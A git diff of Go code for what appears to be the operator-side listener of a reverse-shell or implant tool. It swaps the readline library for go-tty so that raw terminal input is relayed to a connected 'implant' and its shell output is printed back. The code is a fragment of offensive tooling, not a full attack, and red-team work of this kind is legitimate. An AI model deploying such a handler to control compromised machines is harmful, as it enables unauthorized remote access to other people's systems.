@@ -16,8 +16,8 @@ import (
 
 	"github.com/disneystreaming/gomux"
 	"github.com/jessevdk/go-flags"
+	"github.com/mattn/go-tty"
 	log "github.com/sirupsen/logrus"
-	"github.com/wader/readline"
 )
 
 var opts struct {
@@ -123,25 +123,25 @@ func newTLSListener() (net.Listener, error) {
 
 func startShell(conn net.Conn) {
 	log.WithFields(log.Fields{"port": opts.Port, "host": opts.Iface}).Info("Incoming")
+	defer conn.Close()
 
-	conf := &readline.Config{
-		ForceUseInteractive: true,
-	}
-
-	tty, err := readline.NewEx(conf)
+	ttwhy, err := tty.Open()
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer tty.Close()
+	defer ttwhy.Close()
 
-	tty.Terminal.EnterRawMode()
-	defer tty.Terminal.ExitRawMode()
+	unraw, err := ttwhy.Raw()
+	if err != nil {
+		log.Error(err)
+	}
+	defer unraw()
 
-	// continuously read the incoming data and print to stdout
-	go func() { io.Copy(tty.Stdout(), conn) }()
+	// continuously print shell stdout coming from the implant
+	go func() { io.Copy(ttwhy.Output(), conn) }()
 
-	// read stdin from user and send to remote implant
-	io.Copy(conn, tty.Operation.GetConfig().Stdin)
+	// blocking call to read user input
+	io.Copy(conn, ttwhy.Input())
 }
 
 func implantInfo(conn net.Conn) (hostname, username string, err error) {
